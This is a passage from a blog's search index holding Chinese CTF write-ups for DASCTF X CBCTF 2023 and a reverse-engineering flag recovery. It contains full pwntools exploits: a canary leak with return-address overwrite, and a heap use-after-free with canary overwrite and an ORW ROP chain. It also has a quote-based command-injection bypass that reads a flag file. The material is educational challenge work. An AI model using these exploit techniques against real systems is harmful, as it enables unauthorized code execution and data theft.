class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>):<br>            d = flag[i]<br>            <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x100</span>):<br>                <span class="hljs-keyword">if</span> tmp[j] == d:<br>                    ff[i] = j<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>):<br>            f += <span class="hljs-built_in">chr</span>(ff[j])<br>        <span class="hljs-built_in">print</span>(f)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>)<br></code></pre></td></tr></table></figure><p>得到</p><figure class="highlight ceylon"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ceylon">DASCTFKgood<span class="hljs-number">_</span>the<span class="hljs-number">_</span>re<span class="hljs-number">_</span><span class="hljs-keyword">is</span><span class="hljs-number">_</span>easyhhhh&#125;Â<br></code></pre></td></tr></table></figure><p>改一下</p><figure class="highlight ceylon"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ceylon">DASCTF&#123;good<span class="hljs-number">_</span>the<span class="hljs-number">_</span>re<span class="hljs-number">_</span><span class="hljs-keyword">is</span><span class="hljs-number">_</span>easyhhhh&#125;<br></code></pre></td></tr></table></figure><h2 id="ezVM"><a href="#ezVM" class="headerlink" title="ezVM"></a>ezVM</h2>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwn</tag>
      
      <tag>buu</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DASCTF X CBCTF 2023｜无畏者先行</title>
    <link href="/2023/10/24/DASCTF%20X%20CBCTF%202023/"/>
    <url>/2023/10/24/DASCTF%20X%20CBCTF%202023/</url>
    
    <content type="html"><![CDATA[<h2 id="GuestBook"><a href="#GuestBook" class="headerlink" title="GuestBook"></a>GuestBook</h2><p>1.利用printf与\x00截断泄露canary<br>2.利用第一次向栈上写数据将shell写到return_address的位置<br>3.利用第二次向栈上写数据将canary的值恢复</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-comment"># -*-coding:utf-8 -*-</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span>*<br>io_ch=<span class="hljs-number">1</span><br>de_bug=<span class="hljs-number">0</span><br>arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br>filename=<span class="hljs-string">&#x27;./a&#x27;</span><br>context(log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>,arch=arch)<br><span class="hljs-keyword">if</span> io_ch==<span class="hljs-number">1</span>:<br>io=remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">26191</span>)<br><span class="hljs-keyword">else</span>:<br>io=process(filename)<br><span class="hljs-keyword">if</span> de_bug==<span class="hljs-number">1</span>:<br>gdb.attach(io)<br>elf=ELF(filename)<br>libc=ELF(<span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span>)<br><span class="hljs-comment"># - - - - - - - - - - - - - #</span><br>s   = <span class="hljs-keyword">lambda</span> content : io.send(content)<br>sl  = <span class="hljs-keyword">lambda</span> content : io.sendline(content)<br>sa  = <span class="hljs-keyword">lambda</span> content,send : io.sendafter(content, send)<br>sla = <span class="hljs-keyword">lambda</span> content,send : io.sendlineafter(content, send)<br>rc  = <span class="hljs-keyword">lambda</span> number : io.recv(number)<br>ru  = <span class="hljs-keyword">lambda</span> content : io.recvuntil(content)<br>rcg = <span class="hljs-keyword">lambda</span> : u64(rc(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-comment"># - - - - - - - - - - - - - #</span><br>shell=<span class="hljs-number">0x4012C3</span><br>num=<span class="hljs-number">0x4040B0</span><br>message=<span class="hljs-number">0x4040B8</span><br>i=<span class="hljs-number">0x4040c0</span><br>ret=<span class="hljs-number">0x000000000040101a</span><br>vuln=<span class="hljs-number">0x4012D2</span><br><span class="hljs-comment"># - - - - - - - - - - - - - #</span><br><br><span class="hljs-comment"># - - - - - - - - - - - - - #</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">attack</span>():<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;attack start&#x27;</span>)<br>p1=<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x18</span><br>sla(<span class="hljs-string">&quot;Please input your name: &quot;</span>,p1)<br>ru(<span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">0x18</span>)<br>canary_0=u64(rc(<span class="hljs-number">8</span>))+<span class="hljs-number">0xa0</span><br>canary=canary_0-<span class="hljs-number">0xaa</span><br><br>p2=<span class="hljs-string">b&#x27;2&#x27;</span><br>sla(<span class="hljs-string">&quot;How many messages would you like to leave(MAX 4): &quot;</span>,p2)<br>p3=<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0xa0</span>-<span class="hljs-number">8</span>)+p64(canary_0)+<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span>+p64(shell)<br>sleep(<span class="hljs-number">0.2</span>)<br>sl(p3)<br>p4=<span class="hljs-string">b&#x27;b&#x27;</span>*(<span class="hljs-number">0xa0</span>-<span class="hljs-number">32</span>-<span class="hljs-number">8</span>)<br>sleep(<span class="hljs-number">0.2</span>)<br>sl(p4)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;canary_0: &#x27;</span>,<span class="hljs-built_in">hex</span>(canary_0))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;canary: &#x27;</span>,<span class="hljs-built_in">hex</span>(canary))<br><br><br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&quot;__main__&quot;</span>:<br><br>attack()<br>io.interactive()<br></code></pre></td></tr></table></figure><h2 id="EASYBOX"><a href="#EASYBOX" class="headerlink" title="EASYBOX"></a>EASYBOX</h2><p>1.check_ip中并没有对 ‘  与 “  进行过滤</p><p>2.利用c””at fl’’ag读取flag到result.txt中</p><p>3.利用catCommand读取result.txt得到flag</p><h2 id="Binding"><a href="#Binding" class="headerlink" title="Binding"></a>Binding</h2><p>结构</p><figure class="highlight fsharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs fsharp"><span class="hljs-keyword">struct</span> <span class="hljs-keyword">chunk_0</span>&#123;<br>&#125;<br><span class="hljs-keyword">struct</span> <span class="hljs-keyword">chunk_1</span>&#123;<br>chunk_0_ptr(size)<br>&#125;<br><span class="hljs-keyword">struct</span> <span class="hljs-keyword">note</span>&#123;<br>chunk_1_ptr(<span class="hljs-number">0x100</span>)<br><span class="hljs-operator">......</span><br>&#125;<br></code></pre></td></tr></table></figure><p>可分配的堆块的大小为<strong>0xff-0x200</strong>,最大个数为14,容量充分</p><p>存在uaf,我们可以利用<strong>unsorted bin</strong>常规进行一个<strong>heap_base</strong>以及<strong>libc_base</strong>的泄露</p><p>存在沙盒,那我们可以打一个orw</p><p>在<strong>edit</strong>函数中</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">char</span> s[<span class="hljs-number">40</span>]; //<span class="hljs-meta"> [rsp+10h] [rbp-30h] BYREF</span><br><span class="hljs-meta">unsigned __int64 v4; // [rsp+38h] [rbp-8h]</span><br><span class="hljs-attribute">v4</span> = __readfsqword(<span class="hljs-number">0</span>x28u);<br><span class="hljs-attribute">read</span>(<span class="hljs-number">0</span>, s, <span class="hljs-number">0</span>x40uLL);<br></code></pre></td></tr></table></figure><p>存在栈溢出,溢出24字节,可以覆盖<strong>canary+rbp+return</strong></p><p>可以使用栈迁移,但需要我们对canary进行处理</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">puts</span>(<span class="hljs-string">&quot;context1: &quot;</span>);<br>   <span class="hljs-attribute">read</span>(<span class="hljs-number">0</span>, *(&amp;note + v1), <span class="hljs-number">8</span>uLL);<br>   <span class="hljs-attribute">buf</span> = **(&amp;note + v1);<br>   <span class="hljs-attribute">puts</span>(<span class="hljs-string">&quot;context2: &quot;</span>);<br>   <span class="hljs-attribute">read</span>(<span class="hljs-number">0</span>, buf, <span class="hljs-number">8</span>uLL);<br></code></pre></td></tr></table></figure><p>可以进行一个8字节的任意写,</p><p>我们可以利用<strong>edit</strong>函数中的栈溢出</p><p>这里学到了利用任意写覆盖<strong>fs:0x28</strong>的<strong>canary</strong>,使<strong>canary</strong>可以被我们控制</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><code class="hljs css">#!/usr/bin/env python3<br># -*-coding:utf-<span class="hljs-number">8</span> -*-<br>from pwn import*<br>from LibcSearcher import*<br>io_ch=<span class="hljs-number">1</span><br>de_bug=<span class="hljs-number">1</span><br>arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br>filename=<span class="hljs-string">&#x27;./a&#x27;</span><br><span class="hljs-built_in">context</span>(log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>,arch=arch)<br>if io_ch==<span class="hljs-number">1</span>:<br>io=<span class="hljs-built_in">remote</span>(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">28907</span>)<br>#io=<span class="hljs-built_in">remote</span>(<span class="hljs-string">&#x27;172.21.144.1&#x27;</span>,<span class="hljs-number">9999</span>)<br>else:<br>io=<span class="hljs-built_in">process</span>(filename)<br>if de_bug==<span class="hljs-number">1</span>:<br>gdb.<span class="hljs-built_in">attach</span>(io)<br>elf=<span class="hljs-built_in">ELF</span>(filename)<br>#libc=<span class="hljs-built_in">ELF</span>(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br>#<span class="hljs-number">2.31</span><br>libc=<span class="hljs-built_in">ELF</span>(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br># - - - - - - - - - - - - - #<br>s   = lambda content : io.<span class="hljs-built_in">send</span>(content)<br>sl  = lambda content : io.<span class="hljs-built_in">sendline</span>(content)<br>sa  = lambda content,send : io.<span class="hljs-built_in">sendafter</span>(content, send)<br>sla = lambda content,send : io.<span class="hljs-built_in">sendlineafter</span>(content, send)<br>rc  = lambda number : io.<span class="hljs-built_in">recv</span>(number)<br>ru  = lambda content : io.<span class="hljs-built_in">recvuntil</span>(content)<br>rcg = lambda : <span class="hljs-built_in">u64</span>(<span class="hljs-built_in">rc</span>(<span class="hljs-number">6</span>).<span class="hljs-built_in">ljust</span>(<span class="hljs-number">8</span>, b<span class="hljs-string">&#x27;\x00&#x27;</span>))<br># - - - - - - - - - - - - - #<br>def <span class="hljs-built_in">cmd</span>(c):<br><span class="hljs-built_in">sla</span>(<span class="hljs-string">&quot;Your choice:&quot;</span>,<span class="hljs-built_in">str</span>(c))<br>def <span class="hljs-built_in">add</span>(idx,size,data):<br><span class="hljs-built_in">cmd</span>(<span class="hljs-number">1</span>)<br><span class="hljs-built_in">sla</span>(<span class="hljs-string">&quot;Idx:&quot;</span>,<span class="hljs-built_in">str</span>(idx))<br><span class="hljs-built_in">sla</span>(<span class="hljs-string">&quot;Size:&quot;</span>,<span class="hljs-built_in">str</span>(size))<br><span class="hljs-built_in">sa</span>(<span class="hljs-string">&quot;Content:&quot;</span>,data)<br>def <span class="hljs-built_in">edit</span>(idx,data1,data2):<br><span class="hljs-built_in">cmd</span>(<span class="hljs-number">2</span>)<br><span class="hljs-built_in">sa</span>(<span class="hljs-string">&quot;Idx:&quot;</span>,idx)<br><span class="hljs-built_in">sa</span>(<span class="hljs-string">&quot;context1: &quot;</span>,data1)<br><span class="hljs-built_in">sa</span>(<span class="hljs-string">&quot;context2: &quot;</span>,data2)<br>def <span class="hljs-built_in">show</span>(idx,c):<br><span class="hljs-built_in">cmd</span>(<span class="hljs-number">3</span>)<br><span class="hljs-built_in">sla</span>(<span class="hljs-string">&quot;Your choice:&quot;</span>,<span class="hljs-built_in">str</span>(c))<br><span class="hljs-built_in">sla</span>(<span class="hljs-string">&quot;Idx:&quot;</span>,<span class="hljs-built_in">str</span>(idx))<br>def <span class="hljs-built_in">free</span>(idx):<br><span class="hljs-built_in">cmd</span>(<span class="hljs-number">4</span>)<br><span class="hljs-built_in">sla</span>(<span class="hljs-string">&quot;Idx:&quot;</span>,<span class="hljs-built_in">str</span>(idx))<br># - - - - - - - - - - - - - #<br>gadget=[<span class="hljs-number">0</span>xe3afe,<span class="hljs-number">0</span>xe3b01,<span class="hljs-number">0</span>xe3b04]<br># - - - - - - - - - - - - - #<br>def <span class="hljs-built_in">attack</span>():<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;attack start&#x27;</span>)<br><span class="hljs-built_in">add</span>(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>x180,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0</span>x8)<br><span class="hljs-built_in">show</span>(<span class="hljs-number">0</span>,<span class="hljs-number">1</span>)<br><span class="hljs-built_in">ru</span>(<span class="hljs-string">&quot;context:&quot;</span>)<br>heap_base=<span class="hljs-built_in">u64</span>(<span class="hljs-built_in">ru</span>(<span class="hljs-string">&quot;context:&quot;</span>)[-<span class="hljs-number">14</span>:-<span class="hljs-number">8</span>].<span class="hljs-built_in">ljust</span>(<span class="hljs-number">8</span>,b<span class="hljs-string">&#x27;\x00&#x27;</span>))-<span class="hljs-number">0</span>x2a0<br><span class="hljs-built_in">add</span>(<span class="hljs-number">1</span>,<span class="hljs-number">0</span>x180,<span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">0</span>x8)<br><span class="hljs-built_in">add</span>(<span class="hljs-number">2</span>,<span class="hljs-number">0</span>x180,<span class="hljs-string">&#x27;c&#x27;</span>*<span class="hljs-number">0</span>x8)<br><span class="hljs-built_in">add</span>(<span class="hljs-number">3</span>,<span class="hljs-number">0</span>x180,<span class="hljs-string">&#x27;d&#x27;</span>*<span class="hljs-number">0</span>x8)<br><span class="hljs-built_in">add</span>(<span class="hljs-number">4</span>,<span class="hljs-number">0</span>x180,<span class="hljs-string">&#x27;e&#x27;</span>*<span class="hljs-number">0</span>x8)<br><span class="hljs-built_in">add</span>(<span class="hljs-number">5</span>,<span class="hljs-number">0</span>x180,<span class="hljs-string">&#x27;f&#x27;</span>*<span class="hljs-number">0</span>x8)<br><span class="hljs-built_in">add</span>(<span class="hljs-number">6</span>,<span class="hljs-number">0</span>x180,<span class="hljs-string">&#x27;g&#x27;</span>*<span class="hljs-number">0</span>x8)<br><span class="hljs-built_in">add</span>(<span class="hljs-number">7</span>,<span class="hljs-number">0</span>x180,<span class="hljs-string">&#x27;h&#x27;</span>*<span class="hljs-number">0</span>x8)<br><span class="hljs-built_in">free</span>(<span class="hljs-number">0</span>)<br><span class="hljs-built_in">free</span>(<span class="hljs-number">1</span>)<br><span class="hljs-built_in">free</span>(<span class="hljs-number">2</span>)<br><span class="hljs-built_in">free</span>(<span class="hljs-number">3</span>)<br><span class="hljs-built_in">free</span>(<span class="hljs-number">4</span>)<br><span class="hljs-built_in">free</span>(<span class="hljs-number">5</span>)<br><span class="hljs-built_in">free</span>(<span class="hljs-number">6</span>)<br><span class="hljs-built_in">free</span>(<span class="hljs-number">7</span>)<br><span class="hljs-built_in">show</span>(<span class="hljs-number">7</span>,<span class="hljs-number">0</span>)<br>malloc_hook=<span class="hljs-built_in">u64</span>(<span class="hljs-built_in">ru</span>(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].<span class="hljs-built_in">ljust</span>(<span class="hljs-number">8</span>,b<span class="hljs-string">&#x27;\x00&#x27;</span>))-<span class="hljs-number">96</span>-<span class="hljs-number">0</span>x10<br>libc_base=malloc_hook-libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>open=libc_base+libc.sym[<span class="hljs-string">&#x27;open&#x27;</span>]<br>read=libc_base+libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br>puts=libc_base+libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>pop_rdi=libc_base+<span class="hljs-number">0</span>x23b6a<br>pop_rsi=libc_base+<span class="hljs-number">0</span>x2601f<br>pop_rdx=libc_base+<span class="hljs-number">0</span>x142c92<br>leave_ret=libc_base+<span class="hljs-number">0</span>x578c8<br>canary=libc_base+<span class="hljs-number">0</span>x1f3540+<span class="hljs-number">0</span>x28<br>p1=b<span class="hljs-string">&#x27;flag\x00&#x27;</span><br><span class="hljs-built_in">add</span>(<span class="hljs-number">8</span>,<span class="hljs-number">0</span>x180,p1)<br>flag_addr=heap_base+<span class="hljs-number">5376</span><br>p=<span class="hljs-built_in">p64</span>(<span class="hljs-number">0</span>)+<span class="hljs-built_in">p64</span>(pop_rdi)+<span class="hljs-built_in">p64</span>(flag_addr)+<span class="hljs-built_in">p64</span>(pop_rsi)+<span class="hljs-built_in">p64</span>(<span class="hljs-number">0</span>)+<span class="hljs-built_in">p64</span>(pop_rdx)+<span class="hljs-built_in">p64</span>(<span class="hljs-number">0</span>)+<span class="hljs-built_in">p64</span>(open)<br>p+=<span class="hljs-built_in">p64</span>(pop_rdi)+<span class="hljs-built_in">p64</span>(<span class="hljs-number">3</span>)+<span class="hljs-built_in">p64</span>(pop_rsi)+<span class="hljs-built_in">p64</span>(flag_addr)+<span class="hljs-built_in">p64</span>(pop_rdx)+<span class="hljs-built_in">p64</span>(<span class="hljs-number">0</span>x100)+<span class="hljs-built_in">p64</span>(read)<br>p+=<span class="hljs-built_in">p64</span>(pop_rdi)+<span class="hljs-built_in">p64</span>(flag_addr)+<span class="hljs-built_in">p64</span>(puts)<br><span class="hljs-built_in">add</span>(<span class="hljs-number">9</span>,<span class="hljs-number">0</span>x180,p)<br>rop_addr=heap_base+<span class="hljs-number">6048</span><br><span class="hljs-built_in">edit</span>(b<span class="hljs-string">&quot;0&quot;</span>.<span class="hljs-built_in">ljust</span>(<span class="hljs-number">0</span>x30,b<span class="hljs-string">&#x27;\x00&#x27;</span>)+<span class="hljs-built_in">p64</span>(rop_addr)+<span class="hljs-built_in">p64</span>(leave_ret),<span class="hljs-built_in">p64</span>(canary),<span class="hljs-built_in">p64</span>(<span class="hljs-number">0</span>))<br><br>if __name__==<span class="hljs-string">&quot;__main__&quot;</span>:<br><span class="hljs-built_in">attack</span>()<br>io.<span class="hljs-built_in">interactive</span>()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwn</tag>
      
      <tag>buu</tag>
      
    </tags>
    
  </entry>
  
  
  
  
  
  
  <entry>
    <title>about</title>
    <link href="/"/>
    <url>/</url>
    
    <content type="html"><![CDATA[]]></content>
    
  </entry>
  
  
  
</search>
